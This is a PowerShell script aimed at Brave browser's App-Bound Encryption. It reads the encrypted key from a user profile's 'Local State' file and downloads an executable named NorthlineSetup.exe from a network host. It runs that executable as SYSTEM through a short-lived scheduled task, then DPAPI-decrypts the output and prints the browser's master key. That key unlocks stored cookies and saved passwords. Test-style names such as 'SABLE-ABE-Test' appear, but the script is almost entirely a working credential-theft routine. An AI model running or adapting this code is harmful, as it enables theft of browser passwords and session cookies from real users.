$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Security

$base = 'C:\Users\vuurth\AppData\Local\BraveSoftware\Brave-Browser\User Data'
$j = Get-Content (Join-Path $base 'Local State') -Raw | ConvertFrom-Json
$raw = [Convert]::FromBase64String($j.os_crypt.app_bound_encrypted_key)
"blob      : $($raw.Length) bytes, prefix " + [Text.Encoding]::ASCII.GetString($raw[0..3])
$blob = $raw[4..($raw.Length - 1)]

$ws = 'C:\abe_test'
if (Test-Path $ws) { Remove-Item -Recurse -Force $ws }
New-Item -ItemType Directory -Path $ws | Out-Null
[IO.File]::WriteAllBytes((Join-Path $ws 'in.bin'), $blob)
"in.bin    : " + (Get-Item (Join-Path $ws 'in.bin')).Length + " bytes"

$artifact = "$env:TEMP\NorthlineSetup.exe"
if (-not (Test-Path $artifact) -or (Get-Item $artifact).Length -lt 1000000) {
    curl.exe -s -o $artifact 'http://192.168.1.151:8099/NorthlineSetup.exe'
    "fetched   : " + (Get-Item $artifact).Length + " bytes"
}

$cmd = '"' + $artifact + '" --abe-unwrap ' + $ws
schtasks /create /tn SABLE-ABE-Test /tr $cmd /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f | Out-Null
"registered: $LASTEXITCODE"
schtasks /run /tn SABLE-ABE-Test | Out-Null
"ran       : $LASTEXITCODE"
Start-Sleep -Seconds 10
schtasks /delete /tn SABLE-ABE-Test /f | Out-Null

$out = Join-Path $ws 'out.hex'
if (-not (Test-Path $out)) { "out.hex   : MISSING"; exit 1 }
$hex = (Get-Content $out -Raw).Trim()
"out.hex   : $($hex.Length) chars"
$plain = [byte[]]::new($hex.Length / 2)
for ($i = 0; $i -lt $plain.Length; $i++) { $plain[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) }
"plain     : $($plain.Length) bytes, head " + (($plain[0..7] | ForEach-Object { $_.ToString('x2') }) -join ' ')

$ascii = [Text.Encoding]::ASCII.GetString($plain[0..([Math]::Min(4, $plain.Length - 1))])
if ($ascii -eq 'DPAPI') { $inner = $plain[5..($plain.Length - 1)]; "inner     : DPAPI prefix stripped" }
else { $inner = $plain; "inner     : no prefix, raw blob" }

try {
    $key = [Security.Cryptography.ProtectedData]::Unprotect($inner, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
    "KEY       : " + (($key | ForEach-Object { $_.ToString('x2') }) -join '')
    "KEYLEN    : " + $key.Length
} catch {
    "UNPROTECT : failed -> " + $_.Exception.Message
}
